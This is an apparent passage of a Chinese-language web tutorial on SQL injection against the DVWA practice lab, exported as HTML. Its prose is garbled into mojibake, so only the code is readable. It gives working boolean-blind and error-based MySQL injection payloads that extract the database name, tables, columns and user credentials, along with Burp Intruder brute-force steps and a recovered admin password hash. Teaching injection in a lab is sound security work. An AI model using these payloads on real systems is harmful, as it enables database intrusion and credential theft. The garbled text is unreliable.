çš„æ—¶ï¼Œé¡µé¢æ­£å¸¸è¿”å›ç”¨æˆ·ä¿¡æ¯ã€‚å¦‚æœä¼ å…¥ 1â€™ è¯­æ³•ä¼šå‡ºç°è¯­å¥ You have an error in your SQL syntax;è¿™ç§è‹±æ–‡æ˜¯</p><p>mysql è¯­æ³•é”™è¯¯æç¤ºã€‚</p><p>æ ¹æ®ä»£ç åˆ†æâ€™$idâ€™æ˜¯å±äºå­—ç¬¦ä¸²ç±»å‹ æ‰€ä»¥åœ¨è¿›è¡Œ SQL æ³¨å…¥æ£€æµ‹çš„æ—¶å€™è¦æ³¨æ„åŒ¹é…å­—ç¬¦ä¸²</p><h1 id="1-6å¸ƒå°”å‹ç›²æ³¨"><a href="#1-6å¸ƒå°”å‹ç›²æ³¨" class="headerlink" title="1.6å¸ƒå°”å‹ç›²æ³¨"></a>1.6å¸ƒå°”å‹ç›²æ³¨</h1><p>åŸç†ï¼š</p><h2 id="é‡è¦æ€æƒ³ï¼š"><a href="#é‡è¦æ€æƒ³ï¼š" class="headerlink" title="é‡è¦æ€æƒ³ï¼š"></a>é‡è¦æ€æƒ³ï¼š</h2><pre><code>äºŒåˆ†æ³•ï¼›</code></pre><p>åœ¨é¡µé¢ä¸­ä¸ä¼šæ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªä¼šæ˜¾ç¤ºå¯¹ä¸é”™çš„å†…å®¹ã€‚</p><p>ä»£ç åˆ†æ åŠ æ·±å°è±¡</p><p>æ¥æ”¶ id çš„å€¼ï¼Œç›´æ¥å¸¦å…¥æŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨å³è¿”å› users is exists in the database</p><p>å¦åˆ™æ˜¾ç¤º users id is missing åƒè¿™ç§åªæœ‰æ­£ç¡®ä¸é”™è¯¯é¡µé¢ã€‚é¡µé¢ä¸ä¼šæ˜¾ç¤ºæ•°æ®åº“é‡Œä»»ä½•å†…å®¹ï¼Œå¦‚æœå­˜åœ¨</p><p>æ³¨å…¥ï¼Œæˆä¸ºç›²æ³¨å…¥ã€‚</p><p>ç›²æ³¨å…¥çš„æ–¹å¼æœ‰ä¸¤ç§ï¼šä¸€ç§æ˜¯å¸ƒå°”å‹ç›²æ³¨å…¥ï¼Œå¦å¤–ä¸€ç§æ˜¯å»¶æ—¶æ³¨å…¥ã€‚</p><h2 id="1-6-1-åˆ¤æ–­ç›²æ³¨å…¥"><a href="#1-6-1-åˆ¤æ–­ç›²æ³¨å…¥" class="headerlink" title="1.6.1. åˆ¤æ–­ç›²æ³¨å…¥"></a>1.6.1. åˆ¤æ–­ç›²æ³¨å…¥</h2><p>[[1.3 åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥]]<br>    è¾“å…¥ SQL æ³¨å…¥æ£€æµ‹è¯­å¥ åˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·å¤§æ¦‚ä¼šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ 1â€™and â€˜1â€™&#x3D;â€™1 ä¸€æ ·</p><pre><code>and &#39;1&#39;=&#39;2 ä¸ä¸€æ ·ï¼Œå¦‚æœè¾“å…¥æ£€æµ‹è¯­å¥é¡µé¢æ²¡æœ‰ä»»ä½•æ”¹å˜å¯ä»¥ä½¿ç”¨å»¶æ—¶è¯­å¥è¿›è¡Œæ£€æµ‹ 1&#39;andsleep(10)--+ å‡½æ•° sleep() åœ¨ mysql æ˜¯å»¶æ—¶è¿”å›çš„æ„æ€ ä»¥ç§’ä¸ºå•ä½ sleep(10) å³å»¶æ—¶ 10 ç§’æ‰§è¡Œã€‚é€šè¿‡è¿™ä¸¤ä¸ªæ£€æµ‹æ–¹æ³•çš„åˆ¤æ–­ï¼Œå¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</code></pre><h2 id="1-6-2-boolean-å¸ƒå°”å‹æ³¨å…¥æ”»å‡»"><a href="#1-6-2-boolean-å¸ƒå°”å‹æ³¨å…¥æ”»å‡»" class="headerlink" title="1.6.2 boolean å¸ƒå°”å‹æ³¨å…¥æ”»å‡»"></a>1.6.2 boolean å¸ƒå°”å‹æ³¨å…¥æ”»å‡»</h2><pre><code>å¸ƒå°”å‹æ³¨å…¥æ”»å‡»ï¼Œå› ä¸ºé¡µé¢ä¸ä¼šè¿”å›ä»»ä½•æ•°æ®åº“å†…å®¹ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è”åˆæŸ¥è¯¢å°†æ•æ„Ÿä¿¡æ¯æ˜¾ç¤ºåœ¨é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€  SQL è¯­å¥ï¼Œè·å–æ•°æ®ã€‚å¸ƒå°”å‹ç›²æ³¨å…¥ç”¨åˆ°å¾— SQL è¯­å¥ select if(1=1,1,0) if()å‡½æ•°åœ¨ mysql æ˜¯åˆ¤æ–­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¡¨è¾¾å¼ï¼Œå¦‚æœæ¡ä»¶æˆç«‹ï¼Œä¼šæ˜¾ç¤º 1ï¼Œå¦åˆ™æ˜¾ç¤º 0ã€‚1=1 è¡¨è¾¾å¼å¯ä»¥æ¢æˆæ„é€ çš„ SQL æ”»å‡»è¯­å¥ã€‚1&#39; and if(1=1,1,0)--+ é¡µé¢è¿”å›æ­£å¸¸ï¼Œè¿™ä¸ªè¯­å¥å®é™…ä¸Šæ˜¯ 1â€™and 1ï¼ŒçœŸ and çœŸ ç»“æœä¸ºçœŸï¼Œ1 æ˜¯å­˜åœ¨è®°å½•çš„ã€‚æ‰€ä»¥è¿”å›æ­£ç¡®é¡µé¢ã€‚1&#39; and if(1=2,1,0)--+ é¡µé¢è¿”å›é”™è¯¯ï¼Œè¿™ä¸ªè¯­å¥å°±æ˜¯ 1â€™and 0 ï¼ŒçœŸ and å‡ ç»“æœä¸ºå‡ï¼Œæ•´ä¸ª SQL ID çš„ä¹Ÿæ˜¯ 0 æ‰€ä»¥æ²¡æœ‰è®°å½•ï¼Œè¿”å›é”™è¯¯é¡µé¢ã€‚</code></pre><h2 id="1-6-3-å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"><a href="#1-6-3-å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯" class="headerlink" title="1.6.3. å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"></a>1.6.3. å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</h2><p>åœ¨é»‘ç›’çš„ç¯å¢ƒä¸‹ï¼Œé€šè¿‡æ„é€  SQL æ³¨å…¥è¯­å¥ï¼Œæ ¹æ®é¡µé¢çš„ç‰¹å¾ç¡®å®šè·å–æ•æ„Ÿä¿¡æ¯ã€‚</p><p>å¸ƒå°”å‹ç›²æ³¨å…¥ç”¨åˆ°çš„å‡½æ•°</p><p>SUBSTRING()å­—ç¬¦ä¸²æˆªå–ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¼€å§‹æˆªå– ç¬¬ä¸‰ä¸‰ä¸ªæ˜¯æˆªå–çš„é•¿åº¦ã€‚</p><p>select database()æŸ¥è¯¢å½“å‰åº“</p><p>é€šè¿‡ substring æˆªå–æˆªå–é•¿åº¦</p><p>æ¥ç€å†ç”¨ if å‡½æ•°è¿›è¡Œæ„é€  select if(SUBSTRING(database(),1,1)&#x3D;â€™dâ€™,1,0) åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ˜¯ä¸æ˜¯</p><p>å­—ç¬¦ dï¼Œå¦‚æœæ˜¯è¿”å› 1 å¦åˆ™è¿”å› 0 ã€‚</p><p>æ¥ç€åˆ¤æ–­ç¬¬äºŒä¸ªå­—ç¬¦ã€‚å°† substring ç¬¬äºŒä¸ªå‚æ•°å†™æˆ 2 å› ä¸ºè¦æˆªå–ç¬¬äºŒä¸ªå­—ç¬¦</p><p>select if(SUBSTRING(database(),2,1)&#x3D;â€™vâ€™,1,0) ç¬¬äºŒä¸ªå­—ç¬¦ä¸º vã€‚å¦‚æ­¤ç±»æ¨ã€‚å†åæ‹¼æ¥å­—ç¬¦å°±æ˜¯å®Œæ•´çš„</p><p>åº“åã€‚</p><h2 id="æ³¨å…¥æ”»å‡»-1"><a href="#æ³¨å…¥æ”»å‡»-1" class="headerlink" title="æ³¨å…¥æ”»å‡»"></a>æ³¨å…¥æ”»å‡»</h2><h2 id="1-6-4-åœ¨é»‘ç›’æ¨¡å¼ä¸‹å¸ƒå°”å‹æ³¨å…¥"><a href="#1-6-4-åœ¨é»‘ç›’æ¨¡å¼ä¸‹å¸ƒå°”å‹æ³¨å…¥" class="headerlink" title="1.6.4 åœ¨é»‘ç›’æ¨¡å¼ä¸‹å¸ƒå°”å‹æ³¨å…¥"></a>1.6.4 åœ¨é»‘ç›’æ¨¡å¼ä¸‹å¸ƒå°”å‹æ³¨å…¥</h2><p>åœ¨ä¸Šé¢è¯¦ç»†äº†è¯´äº†å¸ƒå°”å‹ç›²æ³¨å…¥çš„åŸç†ï¼Œåœ¨é»‘ç›’çš„æ¨¡å¼ä¸‹è¿›è¡Œæµ‹è¯•ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ³¨å…¥ï¼Œåˆ¤æ–­å®Œæ³¨å…¥å°±è·å–æ•°æ®åº“çš„é•¿åº¦ï¼Œå¾—åˆ°é•¿åº¦å†æŸ¥è¯¢åº“åï¼Œé€šè¿‡åº“åå†æŸ¥è¯¢è¡¨ï¼Œæ¥ç€é€šè¿‡è¡¨</p><p>æŸ¥è¯¢å­—æ®µï¼Œæœ€åæŸ¥è¯¢æŸè¡¨æŒ‡å®šçš„æ•°æ®ã€‚</p><p>1.16.1. å¸ƒå°”å‹å¿™æ³¨å…¥æŸ¥è¯¢é•¿åº¦</p><p>è¦æŸ¥è¯¢å½“å‰åº“åï¼Œé¦–å…ˆç¡®å®šè¦æŸ¥è¯¢æ•°æ®åº“çš„é•¿åº¦ï¼Œå†é€šè¿‡æˆªå–å­—ç¬¦è¿›è¡Œå¯¹æ¯”ã€‚</p><p>1â€™ and if(length(database())&#x3D;4,1,0)â€“+</p><p>åˆ¤æ–­åº“åçš„é•¿åº¦ä¸º 4ï¼Œæˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦å†è¿›è¡Œåˆ¤æ–­</p><p>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</p><p>æ¯æ¬¡éƒ½è¦ä¸è¿™äº›å­—ç¬¦è¿›è¡Œåˆ¤æ–­ã€‚æœ€åå¾—åˆ° d</p><p>1â€™ and if(substring(database(),1,1)&#x3D;â€™dâ€™,1,0)â€“+</p><p>a &#x3D; â€œ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_â€</p><p>for x in a:</p><p>print(x)</p><p>.æŠ“åŒ…å‘é€åˆ°æµ‹è¯•æ¨¡å— é€‰æ‹© Cluster boomb æ¨¡å¼ è®¾ç½®ä¸¤ä¸ªå˜é‡ã€‚<br>ä½¿ç”¨ Burp Suite è¿›è¡Œå¸ƒå°”ç›²æ³¨æ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„ Web å®‰å…¨æµ‹è¯•æ‰‹æ®µã€‚å¸ƒå°”ç›²æ³¨çš„æ ¸å¿ƒåœ¨äºé€šè¿‡é¡µé¢çš„çœŸå‡å“åº”æ¥åˆ¤æ–­æ³¨å…¥æ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œä»è€Œé€æ­¥æå–ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„æ­¥éª¤å’Œæ–¹æ³•ï¼š</p><h3 id="1-é…ç½®-Burp-Suite-å’Œæµ‹è¯•ç¯å¢ƒ"><a href="#1-é…ç½®-Burp-Suite-å’Œæµ‹è¯•ç¯å¢ƒ" class="headerlink" title="1. é…ç½® Burp Suite å’Œæµ‹è¯•ç¯å¢ƒ"></a>1. <strong>é…ç½® Burp Suite å’Œæµ‹è¯•ç¯å¢ƒ</strong></h3><ol><li><strong>å¯åŠ¨ Burp Suite</strong>ï¼šæ‰“å¼€ Burp Suite å¹¶è¿›å…¥ Proxy å·¥å…·ï¼Œç¡®ä¿æ‹¦æˆªçŠ¶æ€ä¸ºå…³é—­ï¼ˆIntercept is offï¼‰ã€‚</li><li><strong>è®¾ç½®ä»£ç†</strong>ï¼šç¡®ä¿ç›®æ ‡åº”ç”¨ç¨‹åºçš„æµé‡é€šè¿‡ Burp Suite çš„ä»£ç†å‘é€ã€‚é€šå¸¸éœ€è¦è®¾ç½®æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„ä»£ç†ï¼ŒæŒ‡å‘è¿è¡Œ Burp Suite çš„æœºå™¨ IP åœ°å€åŠé»˜è®¤ç›‘å¬ç«¯å£ï¼ˆé€šå¸¸æ˜¯ 8080ï¼‰ã€‚</li></ol><h3 id="2-å‘ç°æ³¨å…¥ç‚¹"><a href="#2-å‘ç°æ³¨å…¥ç‚¹" class="headerlink" title="2. å‘ç°æ³¨å…¥ç‚¹"></a>2. <strong>å‘ç°æ³¨å…¥ç‚¹</strong></h3><ol><li><strong>è¯†åˆ«æ½œåœ¨æ³¨å…¥ç‚¹</strong>ï¼šæ‰¾åˆ°åº”ç”¨ç¨‹åºä¸­å¯èƒ½å­˜åœ¨çš„ SQL æ³¨å…¥æ¼æ´ä½ç½®ï¼Œå¦‚æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ã€POST æ•°æ®å­—æ®µæˆ– Cookieã€‚</li><li><strong>æµ‹è¯•å¸ƒå°”ç›²æ³¨</strong>ï¼š<ul><li>æ„é€ ä¸¤ä¸ªæµ‹è¯•è¯­å¥ï¼š<ul><li><code>id=1&#39; AND 1=1 --</code>ï¼šå¦‚æœé¡µé¢æ­£å¸¸åŠ è½½ï¼Œè¯´æ˜æ³¨å…¥ç‚¹å­˜åœ¨ã€‚</li><li><code>id=1&#39; AND 1=2 --</code>ï¼šå¦‚æœé¡µé¢æ˜¾ç¤ºé”™è¯¯æˆ–åŠ è½½å¤±è´¥ï¼Œè¯´æ˜æ³¨å…¥ç‚¹å­˜åœ¨ã€‚</li></ul></li></ul></li></ol><h3 id="3-æ„é€ æœ‰æ•ˆè½½è·"><a href="#3-æ„é€ æœ‰æ•ˆè½½è·" class="headerlink" title="3. æ„é€ æœ‰æ•ˆè½½è·"></a>3. <strong>æ„é€ æœ‰æ•ˆè½½è·</strong></h3><ol><li><strong>ç¡®å®šæ•°æ®åº“åé•¿åº¦</strong>ï¼š<ul><li>æ„é€ å¦‚ä¸‹è¯­å¥ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ Burp Suite çš„ Intruder æ¨¡å—ï¼Œè®¾ç½® Payload ç±»å‹ä¸ºæ•°å­—ï¼Œä» 1 å¼€å§‹é€’å¢ï¼Œç›´åˆ°é¡µé¢å“åº”å‘ç”Ÿå˜åŒ–ã€‚</li></ul></li><li><strong>é€å­—ç¬¦çˆ†ç ´æ•°æ®åº“å</strong>ï¼š<ul><li>æ„é€ å¦‚ä¸‹è¯­å¥ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ Burp Suite çš„ Intruder æ¨¡å—ï¼Œè®¾ç½® Payload ç±»å‹ä¸ºå­—ç¬¦ï¼Œä» a-zã€A-Zã€0-9 ç­‰å­—ç¬¦ä¸­é€ä¸ªå°è¯•ã€‚</li></ul></li></ol><h3 id="4-è‡ªåŠ¨åŒ–çˆ†ç ´è¿‡ç¨‹"><a href="#4-è‡ªåŠ¨åŒ–çˆ†ç ´è¿‡ç¨‹" class="headerlink" title="4. è‡ªåŠ¨åŒ–çˆ†ç ´è¿‡ç¨‹"></a>4. <strong>è‡ªåŠ¨åŒ–çˆ†ç ´è¿‡ç¨‹</strong></h3><ol><li><strong>ä½¿ç”¨ Intruder æ¨¡å—</strong>ï¼š<ul><li>å°†éœ€è¦çˆ†ç ´çš„å‚æ•°æ ‡è®°ä¸ºå˜é‡ã€‚</li><li>é€‰æ‹©åˆé€‚çš„ Payload ç±»å‹ï¼ˆå¦‚æ•°å­—æˆ–å­—ç¬¦ï¼‰ã€‚</li><li>è®¾ç½® Payload çš„èŒƒå›´ï¼ˆå¦‚å­—ç¬¦èŒƒå›´æˆ–æ•°å­—èŒƒå›´ï¼‰ã€‚</li><li>å¯åŠ¨æ”»å‡»ï¼Œè§‚å¯Ÿé¡µé¢å“åº”çš„å˜åŒ–ã€‚</li></ul></li><li><strong>åˆ†æç»“æœ</strong>ï¼š<ul><li>é€šè¿‡å“åº”çš„å˜åŒ–ï¼ˆå¦‚é¡µé¢æ˜¯å¦åŠ è½½æˆåŠŸï¼‰æ¥åˆ¤æ–­æ³¨å…¥æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚</li><li>æ ¹æ®ç»“æœé€æ­¥æå–æ•°æ®åº“åã€è¡¨åã€åˆ—åç­‰ä¿¡æ¯ã€‚</li></ul></li></ol><h3 id="5-ç¤ºä¾‹-2"><a href="#5-ç¤ºä¾‹-2" class="headerlink" title="5. ç¤ºä¾‹"></a>5. <strong>ç¤ºä¾‹</strong></h3><p>å‡è®¾ç›®æ ‡ URL æ˜¯ <code>http://example.com/?id=1</code>ï¼Œç›®æ ‡æ˜¯æå–æ•°æ®åº“åï¼š</p><ol><li><strong>ç¡®å®šæ•°æ®åº“åé•¿åº¦</strong>ï¼š<ul><li>æ„é€ è¯­å¥ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ Burp Suite çš„ Intruder æ¨¡å—ï¼Œè®¾ç½® Payload ç±»å‹ä¸ºæ•°å­—ï¼Œä» 1 å¼€å§‹é€’å¢ï¼Œç›´åˆ°é¡µé¢å“åº”å‘ç”Ÿå˜åŒ–ã€‚</li></ul></li><li><strong>é€å­—ç¬¦çˆ†ç ´æ•°æ®åº“å</strong>ï¼š<ul><li>æ„é€ è¯­å¥ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ Burp Suite çš„ Intruder æ¨¡å—ï¼Œè®¾ç½® Payload ç±»å‹ä¸ºå­—ç¬¦ï¼Œä» a-zã€A-Zã€0-9 ç­‰å­—ç¬¦ä¸­é€ä¸ªå°è¯•ã€‚</li></ul></li></ol><p>å˜é‡ 1 è·å–è®¾ç½®é•¿åº¦ä¸º 4 ï¼Œå˜é‡ 2 è®¾ç½®å¯¼å…¥å­—å…¸ payload.txt æäº¤æ”»å‡»ã€‚</p><p>æ‹¼æ¥å­—ç¬¦å¾—åˆ° dvwa åº“å</p><p>å¾—åˆ°åº“åæ¥ç€è·å–è¡¨å</p><p>1â€™and if(substring((select TABLE_NAME from information_schema.TABLES where</p><p>TABLE_SCHEMA&#x3D;database() limit 1),1,1)&#x3D;â€™gâ€™,1,0)â€“+</p><p>æŠ“åŒ…è®¾ç½®åˆ†åˆ«è®¾ç½®å•ä¸ªå˜é‡</p><p>å¼€å¯æ”»å‡»è·å–è¡¨å guestbook users</p><p>å¾—åˆ°è¡¨åä¹‹å è·å–å­—æ®µå åœ¨ç”¨ burpsuite æŠ“åŒ…ä¿®æ”¹å˜é‡</p><p>1â€™and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;â€™usersâ€™</p><p>limit 1,1),1,1)&#x3D;â€™uâ€™,1,0)â€“+</p><p>å½“å‰åº“çš„è¡¨çš„ç¬¬ä¸€ä¸ªåˆ—å­—ç¬¦æ˜¯å¦ç­‰äº u å¦‚æœç­‰äº u è¿”å›æ­£åˆ™é¡µé¢ å¦åˆ™è¿”å›é”™è¯¯é¡µé¢ã€‚</p><p>select * from users where user_id&#x3D;1 and if(substring((select COLUMN_NAME from</p><p>information_schema.COLUMNS where TABLE_NAME&#x3D;â€™usersâ€™ and TABLE_SCHEMA&#x3D;database() limit</p><p>0,1),1,1)&#x3D;â€™uâ€™,1,0);</p><p>è·å– users è¡¨çš„å­—æ®µ</p><p>æœ€åè·å–è´¦å·å’Œå¯†ç </p><p>é¦–å…ˆåˆ¤æ–­æŸ¥è¯¢è´¦å·å’Œå¯†ç çš„é•¿åº¦</p><p>1â€™and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)&#x3D;38,1,0)â€“+</p><p>ä½¿ç”¨ burpsuie è·å–è´¦å·å’Œå¯†ç </p><p>1â€™and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)&#x3D;â€™aâ€™,1,0)â€“+</p><p>burpsuite æŠ“åŒ…ä¿®æ”¹å€¼ æäº¤æµ‹è¯•ã€‚</p><p>å¾—åˆ°è´¦å·å’Œå¯†ç </p><p>æœ€åæ•´ç†ç»“æœå¾—å‡º admin:5f4dcc3b5aa765d61d8327deb882cf99</p><h1 id="1-7æŠ¥é”™æ³¨å…¥"><a href="#1-7æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.7æŠ¥é”™æ³¨å…¥"></a>1.7æŠ¥é”™æ³¨å…¥</h1><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>æ•°æ®åº“æ˜¾é”™æ˜¯æŒ‡ï¼Œæ•°æ®åº“åœ¨æ‰§è¡Œæ—¶ï¼Œé‡åˆ°è¯­æ³•ä¸å¯¹ï¼Œä¼šæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œä¾‹å¦‚è¯­æ³•é”™è¯­å¥ <code>select 1&#39;</code>ï¼š</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11064 </span>- You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>ç¨‹åºå¼€å‘æœŸé—´éœ€è¦å‘Šè¯‰ä½¿ç”¨è€…æŸäº›æŠ¥é”™ä¿¡æ¯ï¼Œæ–¹ä¾¿ç®¡ç†å‘˜è¿›è¡Œè°ƒè¯•ï¼Œå®šä½æ–‡ä»¶é”™è¯¯ã€‚ç‰¹åˆ«æ˜¯ PHP åœ¨æ‰§è¡Œ SQL è¯­å¥æ—¶ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ•è·é”™è¯¯ä¿¡æ¯ã€‚åœ¨ PHP ä¸­ä½¿ç”¨ <code>mysql_error()</code> å‡½æ•°ã€‚å¦‚æœ SQL æ³¨å…¥å­˜åœ¨æ—¶ï¼Œä¼šæœ‰æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œå¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><h2 id="1-7-1-ä»ä»£ç ä¸­åˆ†æ-SQL-æŠ¥é”™æ³¨å…¥"><a href="#1-7-1-ä»ä»£ç ä¸­åˆ†æ-SQL-æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.7.1 ä»ä»£ç ä¸­åˆ†æ SQL æŠ¥é”™æ³¨å…¥"></a>1.7.1 ä»ä»£ç ä¸­åˆ†æ SQL æŠ¥é”™æ³¨å…¥</h2><p>æ‰“å¼€ DVWA åˆ†æè¯­å¥ã€‚å¦‚æœè¯­æ³•é”™è¯¯ï¼Œ<code>msqli_error()</code>ã€<code>mysqli_connect_error()</code> ä¼šå°†è¯­æ³•é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºåˆ°é¡µé¢ä¸Šã€‚</p><h2 id="1-7-2-SQL-æŠ¥é”™æ³¨å…¥æ”»å‡»"><a href="#1-7-2-SQL-æŠ¥é”™æ³¨å…¥æ”»å‡»" class="headerlink" title="1.7.2 SQL æŠ¥é”™æ³¨å…¥æ”»å‡»"></a>1.7.2 SQL æŠ¥é”™æ³¨å…¥æ”»å‡»</h2><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼šè¾“å…¥å•å¼•å·ï¼Œå¦‚æœæŠ¥é”™æœ‰å¯èƒ½å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚å¦‚æœæ‹¼æ¥ SQL è¯­å¥å¸¦å…¥åˆ° MySQL æ‰§è¡Œï¼Œå³å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>è¾“å…¥ <code>1&#39;and info()--+</code> æ˜¾ç¤ºå½“å‰åº“ï¼ŒåŸç†æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> info()<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>ä¼šæŠ¥é”™æ˜¾ç¤ºå½“å‰åº“ä¸å­˜åœ¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ ·å½“å‰åº“åå°±æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚</p><h2 id="1-7-3-æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"><a href="#1-7-3-æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯" class="headerlink" title="1.7.3 æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"></a>1.7.3 æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</h2><p>è¾“å…¥æ„é€ çš„æ”»å‡»è¯­å¥ï¼Œé¡µé¢è¿”å›æ•°æ®åº“ä¿¡æ¯ï¼š[[å¸¸ç”¨å‡½æ•°]]</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--</span></span><br></pre></td></tr></table></figure><p>æŠŠ <code>user()</code> æ›¿æ¢æˆå…¶ä»–çš„å‡½æ•° <code>version()</code>ã€<code>database()</code> å°±èƒ½å¾—åˆ° MySQL çš„ç‰ˆæœ¬ä¿¡æ¯å’Œå½“å‰åº“åã€‚ä½†æ˜¯é‡‡ç”¨ <code>updatexml</code> æŠ¥é”™å‡½æ•°ï¼Œåªèƒ½æ˜¾ç¤º 32 é•¿åº¦çš„å†…å®¹ï¼Œå¦‚æœè·å–çš„å†…å®¹è¶…è¿‡ 32 å­—ç¬¦å°±è¦é‡‡ç”¨å­—ç¬¦ä¸²æˆªå–æ–¹æ³•ã€‚æ¯æ¬¡è·å– 32 ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p><p>é™¤äº† <code>updatexml</code> å‡½æ•°æ”¯æŒæŠ¥é”™æ³¨å…¥å¤–ï¼ŒMySQL è¿˜æœ‰å¾ˆå¤šå‡½æ•°æ”¯æŒæŠ¥é”™ï¼š</p><ol><li><p><code>floor()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></li><li><p><code>extractvalue()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></li><li><p><code>updatexml()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span 